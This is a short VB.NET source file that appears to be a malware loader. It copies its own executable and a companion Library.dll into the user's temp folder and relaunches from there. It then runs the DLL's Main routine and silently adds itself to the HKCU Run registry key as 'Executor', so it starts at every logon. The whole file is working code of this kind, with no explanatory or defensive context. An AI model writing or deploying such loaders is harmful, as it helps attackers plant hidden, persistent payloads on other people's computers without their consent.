Imports System.Diagnostics
Imports Microsoft.Win32
Module Module1
    Public Sub Main()
        If System.Reflection.Assembly.GetExecutingAssembly.Location = Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName Then
            Try
                Library.Main() 'Load Library.dll
                Try
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Executor", Reflection.Assembly.GetExecutingAssembly.Location) 'Startup
                Catch
                End Try
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        Else
            If IO.File.Exists(Environ("temp") & "\" & "Library.dll") Then
                System.IO.File.Delete(Environ("temp") & "\" & "Library.dll")
            End If
            If IO.File.Exists(Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName) Then
                System.IO.File.Delete(Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName)
            End If
            IO.File.Move(System.Reflection.Assembly.GetExecutingAssembly.Location, Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName)
            IO.File.Move("Library.dll", Environ("temp") & "\" & "Library.dll")
            Threading.Thread.Sleep(1000)
            Process.Start(Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName)
        End If
    End Sub
End Module